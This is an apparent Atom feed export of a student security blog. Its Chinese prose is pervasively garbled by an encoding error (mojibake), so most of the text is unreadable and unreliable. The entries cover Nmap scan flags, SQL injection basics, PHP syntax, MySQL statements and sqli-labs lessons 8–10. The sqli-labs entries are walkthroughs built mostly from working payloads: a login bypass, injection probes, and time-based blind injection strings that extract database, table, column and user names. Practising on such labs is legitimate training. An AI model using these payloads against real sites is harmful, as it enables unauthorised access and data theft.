‡è®°ä½çš„æ•°æ®åŒ…è¿›è¡Œç«¯å£æ¢æµ‹ï¼Œæ”¶åˆ°SYN/ACKåŒ…åˆ™ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œæ”¶åˆ°RST/ACKåŒ…åˆ™ç«¯å£æ˜¯å…³é—­çš„ã€‚<br>-sAï¼šTCP ACKæ‰«æä½¿ç”¨ACKæ ‡å¿—ä½æ•°æ®åŒ…ï¼Œè‹¥ç›®æ ‡ä¸»æœºå›å¤RSTæ•°æ®åŒ…ï¼Œåˆ™ç›®æ ‡ç«¯å£æ²¡æœ‰è¢«è¿‡æ»¤ï¼ˆç”¨äºå‘ç°é˜²<br>ç«å¢™çš„è¿‡æ»¤è§„åˆ™)ã€‚</p><h6 id="Nmap-UDPæ‰«æç«¯å£é€‰é¡¹"><a href="#Nmap-UDPæ‰«æç«¯å£é€‰é¡¹" class="headerlink" title="Nmap UDPæ‰«æç«¯å£é€‰é¡¹:"></a>Nmap UDPæ‰«æç«¯å£é€‰é¡¹:</h6><p>-sUä½¿ç”¨UDPæ•°æ®åŒ…ç»è¡Œæ‰«æï¼Œè¿”å›UDPæŠ¥æ–‡ï¼Œåˆ™ç«¯å£æ˜¯å¼€æ”¾çš„;è¿”å›ä¸å¯è¾¾åˆ™ç«¯å£å¤„äºå…³é—­æˆ–è¿‡æ»¤çŠ¶æ€ã€‚</p><h6 id="Nmapç›®æ ‡ç«¯å£é€‰é¡¹"><a href="#Nmapç›®æ ‡ç«¯å£é€‰é¡¹" class="headerlink" title="Nmapç›®æ ‡ç«¯å£é€‰é¡¹:"></a>Nmapç›®æ ‡ç«¯å£é€‰é¡¹:</h6><p>-pï¼šæ‰«ææŒ‡å®šçš„ç«¯å£<br>-Fï¼šå¿«é€Ÿæ‰«æ100ä¸ªå¸¸ç”¨çš„ç«¯å£<br>-rï¼šé¡ºåºæ‰«æï¼ŒæŒ‰ä»å°åˆ°å¤§çš„é¡ºåºè¿›è¡Œç«¯å£æ‰«æ</p><h6 id="Nmapè¾“å‡ºé€‰é¡¹"><a href="#Nmapè¾“å‡ºé€‰é¡¹" class="headerlink" title="Nmapè¾“å‡ºé€‰é¡¹:"></a>Nmapè¾“å‡ºé€‰é¡¹:</h6><p>-oNï¼šæ ‡å‡†è¾“å‡ºä¸ºæŒ‡å®šçš„æ–‡ä»¶<br>-oXï¼šç”ŸæˆXMLæ ¼å¼æ–‡ä»¶å¯ä»¥è½¬æ¢æˆHTMLæ–‡ä»¶</p><h6 id="å…¶ä»–å¸¸ç”¨é€‰é¡¹"><a href="#å…¶ä»–å¸¸ç”¨é€‰é¡¹" class="headerlink" title="å…¶ä»–å¸¸ç”¨é€‰é¡¹:"></a>å…¶ä»–å¸¸ç”¨é€‰é¡¹:</h6><p>-sVï¼šæ£€æµ‹æœåŠ¡ç«¯è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯<br>-Oï¼šæ£€æµ‹æ“ä½œç³»ç»Ÿä¿¡æ¯<br>-Pnï¼šç¦ç”¨nmapçš„ä¸»æœºæ£€æµ‹åŠŸèƒ½<br>-Aï¼šæ¢æµ‹æœåŠ¡ç‰ˆæœ¬ã€å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œè¯†åˆ«ã€è¿›è¡Œè„šæœ¬æ‰«æã€è¿›è¡Œè·¯ç”±æ¢æµ‹</p><p>æ³¨ï¼šnmap -sP ipæ®µå¯æ£€æµ‹è¯¥ç½‘æ®µä¸‹æ‰€æœ‰å­˜æ´»çš„ä¸»æœº</p><p>æœ¬ç« å‚è€ƒpptï¼š<a href="https://kdocs.cn/l/ctOPJlaBJgUw">https://kdocs.cn/l/ctOPJlaBJgUw</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;webæ¸—é€çš„å®è§‚æ€è·¯ï¼š&quot;&gt;&lt;a href=&quot;#webæ¸—é€çš„å®è§‚æ€è·¯ï¼š&quot; class=&quot;headerlink&quot; title=&quot;webæ¸—é€çš„å®è§‚æ€è·¯ï¼š&quot;&gt;&lt;/a&gt;webæ¸—é€çš„å®è§‚æ€è·¯ï¼š&lt;/h3&gt;&lt;h5 id=&quot;a-ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#a-ä¿¡æ¯æ”¶é›†&quot; cla</summary>
      
    
    
    
    
    <category term="webæ¸—é€" scheme="http://example.com/tags/web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>2021-1æœˆwebæ¸—é€åŸ¹è®­(2)</title>
    <link href="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/"/>
    <id>http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/</id>
    <published>2021-01-27T02:56:06.000Z</published>
    <updated>2021-02-05T03:19:26.651Z</updated>
    
    <content type="html"><![CDATA[<p>SQLæ³¨å…¥åŸç†ï¼ˆwebæ¼æ´ï¼‰ï¼š</p><p>å°†ç”¨æˆ·çš„è¾“å…¥å½“ä½œä»£ç /æŒ‡ä»¤ï¼Œåœ¨æ•°æ®åº“ä¸­æ“ä½œã€æ‰§è¡Œ</p><p>ä¾‹å¦‚ï¼šç”¨æˆ·åï¼šadmin å¯†ç ï¼š123</p><p>æ­£å¸¸å¸¦å…¥æ•°æ®åº“ä¸­æ‰§è¡Œï¼šselect *from users where username=â€˜adminâ€™ and password=â€˜123â€™â€“è¿”å›æ­£ç¡®ï¼ŒæˆåŠŸç™»å…¥ï¼›</p><p>åˆ©ç”¨SQLæ³¨å…¥ï¼š</p><p>æ„é€ payloadï¼šç”¨æˆ·åï¼šadminâ€˜ or â€™1â€˜=â€™1 å¯†ç =â€˜éšæ„â€™ï¼›</p><p>å¸¦å…¥æ•°æ®åº“ä¸­æ‰§è¡Œï¼šselect *from users where username=â€˜adminâ€˜ or â€™1â€˜=â€™1â€™ and password=â€˜éšæ„â€™â€“è¿”å›æ­£ç¡®ï¼ŒæˆåŠŸç™»å…¥ï¼›æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•°æ®åº“è¯¯æŠŠç”¨æˆ·çš„è¾“å…¥å½“åšä»£ç ï¼Œæ•´åˆåˆ°æºç ä¸­ï¼Œ1=1æ’æˆç«‹æ•…å¯¼è‡´è¯¥è¯­å¥æ’æˆç«‹ã€‚</p><p>æ³¨ï¼šæ•°æ®åº“ä¸­ â€˜ = â€™ ä¼˜å…ˆçº§é«˜äº â€˜andâ€™ é«˜äº â€˜orâ€™ï¼›</p><p>é¢„é˜²SQLæ³¨å…¥ï¼šè¿‡æ»¤ç”¨æˆ·çš„ç‰¹æ®Šè¾“å…¥ï¼ˆå…³é”®å­—ï¼šandç­‰ï¼Œå­—ç¬¦ï¼šâ€˜ ç­‰ï¼‰ï¼Œé¢„ç¼–è¯‘ï¼ˆå°†ç”¨æˆ·çš„è¾“å…¥å½“ä½œå­—ç¬¦ä¸²ï¼Œå³ä¸æ•°æ®åº“ä¸ä¼šæ‰§è¡Œå¤¹æ‚åœ¨ç”¨æˆ·è¾“å…¥çš„ä»£ç ä¸­ï¼‰ï¼›</p><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼š</p><p>(1)?id=1â€™ â€“é¡µé¢æ˜¯å¦æŠ¥é”™</p><p>(2)?id=1â€™ and â€˜1â€™=â€™1â€“é¡µé¢æ˜¯å¦æ­£å¸¸</p><p>(3)?id=1â€™ and â€˜1â€™=â€™2â€“é¡µé¢æ˜¯å¦å¼‚å¸¸</p><p>è‹¥(1)æŠ¥é”™(2)æ­£å¸¸(3)å¼‚å¸¸åˆ™è¯´æ˜å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</p><p>å‚è€ƒpptï¼š<a href="https://kdocs.cn/l/crYKxbz6UgjE">https://kdocs.cn/l/crYKxbz6UgjE</a>  å¯†ç goktech</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;SQLæ³¨å…¥åŸç†ï¼ˆwebæ¼æ´ï¼‰ï¼š&lt;/p&gt;
&lt;p&gt;å°†ç”¨æˆ·çš„è¾“å…¥å½“ä½œä»£ç /æŒ‡ä»¤ï¼Œåœ¨æ•°æ®åº“ä¸­æ“ä½œã€æ‰§è¡Œ&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ï¼šç”¨æˆ·åï¼šadmin å¯†ç ï¼š123&lt;/p&gt;
&lt;p&gt;æ­£å¸¸å¸¦å…¥æ•°æ®åº“ä¸­æ‰§è¡Œï¼šselect *from users where username=â€˜adminâ€™ an</summary>
      
    
    
    
    
    <category term="webæ¸—é€" scheme="http://example.com/tags/web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHPè¯­æ³•</title>
    <link href="http://example.com/2021/01/25/PHP%E8%AF%AD%E6%B3%95/"/>
    <id>http://example.com/2021/01/25/PHP%E8%AF%AD%E6%B3%95/</id>
    <published>2021-01-25T04:18:49.000Z</published>
    <updated>2021-02-03T03:45:18.625Z</updated>
    
    <content type="html"><![CDATA[<h5 id="PHPæ ‡è®°ï¼š"><a href="#PHPæ ‡è®°ï¼š" class="headerlink" title="PHPæ ‡è®°ï¼š"></a>PHPæ ‡è®°ï¼š</h5><p>æˆ‘ä»¬ä¸»è¦ä½¿ç”¨&lt; ?php ?&gt; ï¼›</p><h5 id="PHPä¸­çš„åˆ†éš”ç¬¦ï¼š"><a href="#PHPä¸­çš„åˆ†éš”ç¬¦ï¼š" class="headerlink" title="PHPä¸­çš„åˆ†éš”ç¬¦ï¼š"></a>PHPä¸­çš„åˆ†éš”ç¬¦ï¼š</h5><p>1ã€PHPä¸­çš„â€œç»“æ„å®šä¹‰è¯­å¥â€ï¼ˆåˆ†æ”¯ï¼Œå¾ªç¯ï¼Œç±»ï¼Œå‡½æ•°ç­‰{}ç»“å°¾ï¼‰ï¼Œä¸éœ€è¦ä½¿ç”¨åˆ†å·ç»“å°¾ã€‚<br>2ã€PHPä¸­çš„â€œåŠŸèƒ½æ‰§è¡Œè¯­å¥â€ï¼Œä¸ç”¨{}ç»“å°¾çš„ï¼Œå¿…é¡»ä½¿ç”¨åˆ†å·ç»“å°¾ã€‚</p><h5 id="PHPä¸­çš„å˜é‡ï¼š"><a href="#PHPä¸­çš„å˜é‡ï¼š" class="headerlink" title="PHPä¸­çš„å˜é‡ï¼š"></a>PHPä¸­çš„å˜é‡ï¼š</h5><p>1.PHPæ˜¯ä¸€ç§å¼±ç±»å‹è¯­è¨€ã€‚å˜é‡æ— éœ€å£°æ˜ï¼Œç›´æ¥ç»™å˜é‡èµ‹å€¼å³å¯ï¼Œå¹¶ä¸”å¯ä»¥åœ¨åç»­èµ‹å€¼è¿‡ç¨‹ä¸­éšæ—¶ä¿®æ”¹å˜é‡çš„æ•°æ®ç±»å‹ã€‚</p><p>2.PHPä¸­å¯ä»¥ä½¿ç”¨è¿ç­‰åŒæ—¶å£°æ˜å¤šä¸ªå˜é‡ï¼Œè€Œä¸èƒ½ä½¿ç”¨é€—å·åˆ†éš”ã€‚egï¼š$a=$b=$c=10</p><p>spï¼šPHPè¯­æ³•å­¦ä¹ è¯¦æƒ…å‚è€ƒï¼š<a href="https://www.cnblogs.com/suitongyu/p/7748153.html">https://www.cnblogs.com/suitongyu/p/7748153.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;PHPæ ‡è®°ï¼š&quot;&gt;&lt;a href=&quot;#PHPæ ‡è®°ï¼š&quot; class=&quot;headerlink&quot; title=&quot;PHPæ ‡è®°ï¼š&quot;&gt;&lt;/a&gt;PHPæ ‡è®°ï¼š&lt;/h5&gt;&lt;p&gt;æˆ‘ä»¬ä¸»è¦ä½¿ç”¨&amp;lt; ?php ?&amp;gt; ï¼›&lt;/p&gt;
&lt;h5 id=&quot;PHPä¸­çš„åˆ†éš”ç¬¦ï¼š&quot;&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>lesson9ã€lesson10</title>
    <link href="http://example.com/2020/12/13/blog%20j/"/>
    <id>http://example.com/2020/12/13/blog%20j/</id>
    <published>2020-12-13T14:20:36.000Z</published>
    <updated>2021-01-30T14:46:43.374Z</updated>
    
    <content type="html"><![CDATA[<h4 id="lesson9"><a href="#lesson9" class="headerlink" title="lesson9"></a>lesson9</h4><p>è¿™é¢˜å¾ˆæœ‰æ„æ€ï¼Œæˆ‘å‘ç°ä¸ç®¡è¾“å…¥ä»€ä¹ˆï¼Œè¿”å›å€¼éƒ½æ˜¯you are inï¼Œäºæ˜¯æˆ‘æŸ¥çœ‹æºä»£ç â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;</span><br><span class="line">  echo &#39;You are in...........&#39;;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;</span><br><span class="line">echo &#39;You are in...........&#39;;</span><br><span class="line">&#x2F;&#x2F;print_r(mysql_error());</span><br><span class="line">&#x2F;&#x2F;echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸è®ºè¾“å…¥ç»“æœæ­£ç¡®ä¸å¦è¾“å‡ºéƒ½ä¸ºyou are in</p><p>é€šè¿‡é¢˜ç›®æˆ‘ä»¬çŸ¥é“æ³¨å…¥ç‚¹ä¸º â€™</p><p>äºæ˜¯æˆ‘è§‰å¾—å¯ä»¥åˆ©ç”¨æ—¶é—´ç›²æ³¨ï¼Œé€šè¿‡å»¶æ—¶åˆ¤æ–­è¯­å¥æ­£ç¡®ä¸å¦ï¼Œäºæ˜¯è¾“å…¥çˆ†åº“è¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and If(substr(database(),1,1)&#x3D;&#39;e&#39;,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p>å‘ç°å¯è¡Œï¼Œé‚£ä¹ˆå‰©ä¸‹çš„å†…å®¹å’Œlesson8å°±ä¸€æ¨¡ä¸€æ ·äº†ã€‚</p><h4 id="lesson10"><a href="#lesson10" class="headerlink" title="lesson10"></a>lesson10</h4><p>è¿™é¢˜åŸºäºlesson9ï¼Œä½†æ³¨å…¥ç‚¹æœ‰åˆ«äºlesson9ä¸º â€˜â€™</p><p>å…¶ä½™çš„ä¹Ÿä¸€æ ·äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;lesson9&quot;&gt;&lt;a href=&quot;#lesson9&quot; class=&quot;headerlink&quot; title=&quot;lesson9&quot;&gt;&lt;/a&gt;lesson9&lt;/h4&gt;&lt;p&gt;è¿™é¢˜å¾ˆæœ‰æ„æ€ï¼Œæˆ‘å‘ç°ä¸ç®¡è¾“å…¥ä»€ä¹ˆï¼Œè¿”å›å€¼éƒ½æ˜¯you are inï¼Œäºæ˜¯æˆ‘æŸ¥çœ‹æºä»£ç â€”â€”&lt;/p&gt;
&lt;f</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lessen8</title>
    <link href="http://example.com/2020/12/13/blog%20i/"/>
    <id>http://example.com/2020/12/13/blog%20i/</id>
    <published>2020-12-13T07:23:18.000Z</published>
    <updated>2021-01-30T14:46:52.228Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ä¸€-çˆ†åº“"><a href="#ä¸€-çˆ†åº“" class="headerlink" title="ä¸€.çˆ†åº“"></a>ä¸€.çˆ†åº“</h4><p>é¦–å…ˆè¾“å…¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1--+</span><br></pre></td></tr></table></figure><p>é¡µé¢å›æ˜¾you are in</p><p>æ¥ç€æ‰“å¼€æºç æŸ¥çœ‹åˆ°â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>åˆ™æ³¨å…¥ç‚¹ä¸º â€˜   ï¼Œè¾“å…¥è¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; or 1&#x3D;1--+</span><br></pre></td></tr></table></figure><p>å›æ˜¾æ­£ç¡®ã€‚é‚£ä¹ˆè¿™æ—¶æˆ‘è§‰å¾—è¿™å’Œlesson5æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼ŸæŸ¥çœ‹æºä»£ç å‘ç°â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>ä»–å¯¹mysqlæŠ¥é”™è¯­å¥è¿›è¡Œäº†æ³¨é‡Šï¼Œå³è¿™å…³ä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p><p>äºæ˜¯æˆ‘ç”¨å¸ƒå°”ç›²æ³¨ï¼Œæˆ‘å‘ç°ä¸ç®¡æˆ‘è¾“å…¥è¯­å¥åˆ¤æ–­æ­£ç¡®ä¸å¦ä»–è¿”å›çš„éƒ½æ˜¯you are iné‚£ä¹ˆè¯´æ˜æˆ‘ä»¬æƒ³è¦ä½¿ç”¨å¸ƒå°”ç›²æ³¨ä¹Ÿæ˜¯ä¸è¡Œçš„ã€‚é‚£ä¹ˆæœ€åå°è¯•ä¸€ä¸‹æ—¶é—´ç›²æ³¨ï¼Œè¾“å…¥è¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br><span class="line">æˆ–</span><br><span class="line">?id&#x3D;1&#39;and If(substr(database(),1,1)&#x3D;&#39;s&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥è¡Œå¾—é€šï¼Œé‚£ä¹ˆæœ¬é¢˜ä½¿ç”¨æ—¶é—´ç›²æ³¨æ— ç–‘äº†ã€‚</p><h4 id="äºŒ-çˆ†è¡¨"><a href="#äºŒ-çˆ†è¡¨" class="headerlink" title="äºŒ.çˆ†è¡¨"></a>äºŒ.çˆ†è¡¨</h4><p>è¾“å…¥è¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1),1,1)&#x3D;&#39;e&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure><h4 id="ä¸‰-çˆ†åˆ—"><a href="#ä¸‰-çˆ†åˆ—" class="headerlink" title="ä¸‰.çˆ†åˆ—"></a>ä¸‰.çˆ†åˆ—</h4><p>è¾“å…¥è¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(substr((select column_name from information_schema.columns where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;&#39;i&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure><h4 id="å››-çˆ†å€¼"><a href="#å››-çˆ†å€¼" class="headerlink" title="å››.çˆ†å€¼"></a>å››.çˆ†å€¼</h4><p>è¾“å…¥è¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(substr((select username from users limit 0,1),1,1)&#x3D;&#39;D&#39;,1,sleep(5)) --+</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;ä¸€-çˆ†åº“&quot;&gt;&lt;a href=&quot;#ä¸€-çˆ†åº“&quot; class=&quot;headerlink&quot; title=&quot;ä¸€.çˆ†åº“&quot;&gt;&lt;/a&gt;ä¸€.çˆ†åº“&lt;/h4&gt;&lt;p&gt;é¦–å…ˆè¾“å…¥â€”â€”&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>mysql</title>
    <link href="http://example.com/2020/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"/>
    <id>http://example.com/2020/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</id>
    <published>2020-12-07T08:25:42.000Z</published>
    <updated>2021-04-10T06:03:28.612Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><h4 id="ä¸€-MySQLçš„å¢åˆ æ”¹æŸ¥è¯­å¥ã€‚"><a href="#ä¸€-MySQLçš„å¢åˆ æ”¹æŸ¥è¯­å¥ã€‚" class="headerlink" title="ä¸€.MySQLçš„å¢åˆ æ”¹æŸ¥è¯­å¥ã€‚"></a>ä¸€.MySQLçš„å¢åˆ æ”¹æŸ¥è¯­å¥ã€‚</h4><h5 id="1-å¢ï¼šæœ‰å››ç§æ–¹æ³•"><a href="#1-å¢ï¼šæœ‰å››ç§æ–¹æ³•" class="headerlink" title="1.å¢ï¼šæœ‰å››ç§æ–¹æ³•"></a>1.å¢ï¼šæœ‰å››ç§æ–¹æ³•</h5><p>a.ä½¿ç”¨insertæ’å…¥å•è¡Œæ•°æ®ï¼›è¯­æ³•æ ¼å¼ä¸ºinsert into è¡¨åï¼ˆåˆ—åï¼‰ values ï¼ˆâ€™åˆ—å€¼â€™ï¼‰ï¼›</p><p>ä¾‹å¦‚ï¼šinsert into lcjï¼ˆå§“åï¼Œç­çº§ï¼Œåº§å·ï¼‰values ï¼ˆâ€˜å°æ—â€™ï¼Œâ€˜ç½‘å®‰ä¸€ç­â€™ï¼Œâ€˜30â€™ï¼‰ï¼›</p><p>b.insert è¡¨å set åˆ—å=â€˜åˆ—å€¼â€™ï¼Œåˆ—å=â€˜åˆ—å€¼â€™â€¦â€¦..</p><p>æ³¨ï¼šå¢åŠ çš„åˆ—å€¼æ˜¯å¡«å……åœ¨æ–°ä¸€è¡Œã€‚</p><h5 id="2-åˆ ï¼š"><a href="#2-åˆ ï¼š" class="headerlink" title="2.åˆ ï¼š"></a>2.åˆ ï¼š</h5><h6 id="a-ä½¿ç”¨deleteåˆ é™¤æ•°æ®ï¼›è¯­æ³•æ ¼å¼ä¸ºdelete-from-è¡¨å-ï¼›å¯åœ¨è¡¨ååé¢åŠ whereè¯­å¥æ¥å……å½“æ¡ä»¶è¯­å¥ã€‚"><a href="#a-ä½¿ç”¨deleteåˆ é™¤æ•°æ®ï¼›è¯­æ³•æ ¼å¼ä¸ºdelete-from-è¡¨å-ï¼›å¯åœ¨è¡¨ååé¢åŠ whereè¯­å¥æ¥å……å½“æ¡ä»¶è¯­å¥ã€‚" class="headerlink" title="a.ä½¿ç”¨deleteåˆ é™¤æ•°æ®ï¼›è¯­æ³•æ ¼å¼ä¸ºdelete from è¡¨å ï¼›å¯åœ¨è¡¨ååé¢åŠ whereè¯­å¥æ¥å……å½“æ¡ä»¶è¯­å¥ã€‚"></a>a.ä½¿ç”¨deleteåˆ é™¤æ•°æ®ï¼›è¯­æ³•æ ¼å¼ä¸ºdelete from è¡¨å ï¼›å¯åœ¨è¡¨ååé¢åŠ whereè¯­å¥æ¥å……å½“æ¡ä»¶è¯­å¥ã€‚</h6><h6 id="ä¾‹å¦‚ï¼šdelete-from-lcj-where-name-â€˜å°æ—â€™ï¼›è¯‘ä¸ºåˆ é™¤è¡¨lcjä¸­åˆ—å€¼ä¸ºå°æ—çš„è¡Œï¼ˆæ³¨æ„ï¼šæ˜¯ä¸€æ•´è¡Œï¼ï¼‰"><a href="#ä¾‹å¦‚ï¼šdelete-from-lcj-where-name-â€˜å°æ—â€™ï¼›è¯‘ä¸ºåˆ é™¤è¡¨lcjä¸­åˆ—å€¼ä¸ºå°æ—çš„è¡Œï¼ˆæ³¨æ„ï¼šæ˜¯ä¸€æ•´è¡Œï¼ï¼‰" class="headerlink" title="ä¾‹å¦‚ï¼šdelete from lcj where name=â€˜å°æ—â€™ï¼›è¯‘ä¸ºåˆ é™¤è¡¨lcjä¸­åˆ—å€¼ä¸ºå°æ—çš„è¡Œï¼ˆæ³¨æ„ï¼šæ˜¯ä¸€æ•´è¡Œï¼ï¼‰"></a>ä¾‹å¦‚ï¼šdelete from lcj where name=â€˜å°æ—â€™ï¼›è¯‘ä¸ºåˆ é™¤è¡¨lcjä¸­åˆ—å€¼ä¸ºå°æ—çš„è¡Œï¼ˆæ³¨æ„ï¼šæ˜¯ä¸€æ•´è¡Œï¼ï¼‰</h6><h5 id="3-æ”¹ï¼š"><a href="#3-æ”¹ï¼š" class="headerlink" title="3.æ”¹ï¼š"></a>3.æ”¹ï¼š</h5><h6 id="a-è¿ç”¨updateå¯¹åŸ1åˆ—å€¼è¿›è¡Œæ”¹åŠ¨ï¼›è¯­æ³•update-è¡¨å-set-åˆ—å-æ›´æ–°å€¼ï¼›ä¾‹å¦‚ï¼šupdate-lcj-set-åº§å·-1ï¼›å¯åœ¨æ›´æ–°å€¼åé¢åŠ whereè¯­å¥æ¥å……å½“æ¡ä»¶è¯­å¥ï¼›"><a href="#a-è¿ç”¨updateå¯¹åŸ1åˆ—å€¼è¿›è¡Œæ”¹åŠ¨ï¼›è¯­æ³•update-è¡¨å-set-åˆ—å-æ›´æ–°å€¼ï¼›ä¾‹å¦‚ï¼šupdate-lcj-set-åº§å·-1ï¼›å¯åœ¨æ›´æ–°å€¼åé¢åŠ whereè¯­å¥æ¥å……å½“æ¡ä»¶è¯­å¥ï¼›" class="headerlink" title="a.è¿ç”¨updateå¯¹åŸ1åˆ—å€¼è¿›è¡Œæ”¹åŠ¨ï¼›è¯­æ³•update è¡¨å set åˆ—å=æ›´æ–°å€¼ï¼›ä¾‹å¦‚ï¼šupdate lcj set åº§å·=1ï¼›å¯åœ¨æ›´æ–°å€¼åé¢åŠ whereè¯­å¥æ¥å……å½“æ¡ä»¶è¯­å¥ï¼›"></a>a.è¿ç”¨updateå¯¹åŸ1åˆ—å€¼è¿›è¡Œæ”¹åŠ¨ï¼›è¯­æ³•update è¡¨å set åˆ—å=æ›´æ–°å€¼ï¼›ä¾‹å¦‚ï¼šupdate lcj set åº§å·=1ï¼›å¯åœ¨æ›´æ–°å€¼åé¢åŠ whereè¯­å¥æ¥å……å½“æ¡ä»¶è¯­å¥ï¼›</h6><h5 id="4-æŸ¥ï¼š"><a href="#4-æŸ¥ï¼š" class="headerlink" title="4.æŸ¥ï¼š"></a>4.æŸ¥ï¼š</h5><h6 id="a-æŸ¥è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼šselect-from-è¡¨åï¼›"><a href="#a-æŸ¥è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼šselect-from-è¡¨åï¼›" class="headerlink" title="a.æŸ¥è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼šselect *from è¡¨åï¼›"></a>a.æŸ¥è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼šselect *from è¡¨åï¼›</h6><p>b.</p><h4 id="äºŒ-MySQLè¯­å¥ä½¿ç”¨ç»ƒä¹ ã€‚"><a href="#äºŒ-MySQLè¯­å¥ä½¿ç”¨ç»ƒä¹ ã€‚" class="headerlink" title="äºŒ.MySQLè¯­å¥ä½¿ç”¨ç»ƒä¹ ã€‚"></a>äºŒ.MySQLè¯­å¥ä½¿ç”¨ç»ƒä¹ ã€‚</h4><p>1.å»ºç«‹æ•°æ®åº“ï¼šcreate database class character set gbk;   